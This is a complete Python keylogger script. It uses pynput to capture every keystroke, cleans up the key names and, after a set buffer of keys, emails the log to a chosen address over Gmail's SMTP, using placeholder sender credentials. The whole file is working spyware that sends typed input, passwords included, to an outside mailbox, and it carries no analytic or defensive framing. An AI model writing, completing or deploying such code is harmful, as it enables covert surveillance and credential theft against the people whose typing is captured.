import smtplib, ssl
import pynput
from pynput.keyboard import Key, Listener

provider = "smtp.gmail.com"       # Email provider of choice
port = 465
sender = "senderEmail"            # yourSenderEmail
password = "senderEmailPass"      # yourSenderPassword
receiver = "receiverEmail"        # yourReceiverEmail
log = ""
buffer = 300                      # Amount of keys before the email is send
default_msg = """\
Subject: New log created

"""
def parseStr(str, old, new):              # Initial string, keywords to replace, replacements
    result = str.replace("''", "")              # default replacement of unnecessary strings
    iter = 0

    for i in old:
        result = result.replace(i, new[iter])
        iter += 1

    return result

def onPress(key):
    global log, buffer, default_msg
 
    if(len(log) >= buffer):
        log = parseStr(log, ["Key.backspace", "Key.space", "Key.enter", "Key.shift"], ["", "\n", "\n", "SH"])
        log = default_msg + log
        connection(log)
        log = ""
                   
    else:
        log += str(key)

def onRelease(key):
    if(key == Key.esc):
        return False            # Exit the program if the Escape key is pressed

def connection(message):
    context = ssl.create_default_context()

    with smtplib.SMTP_SSL(provider, port, context=context) as server:
        server.login(sender, password)                                  # Login to email account
        server.sendmail(sender, receiver, message)                      # Sending the email

with Listener(on_press=onPress, on_release=onRelease) as listener:      # Listens for key actions
    listener.join()